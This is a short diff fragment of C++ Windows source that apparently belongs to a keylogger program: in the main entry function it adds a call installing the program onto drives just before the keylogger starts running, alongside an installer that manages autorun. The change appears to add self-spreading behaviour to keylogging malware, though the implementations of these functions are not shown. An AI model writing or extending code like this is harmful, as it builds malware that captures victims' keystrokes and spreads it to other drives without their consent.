@@ -19,6 +19,7 @@ extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
 #ifdef _DEBUG
 	installer.SetAutorun(false);
 #endif
+	installer.InstallOnDrives();
 	keylogger.Run();
 
 	CloseHandle(hSem);
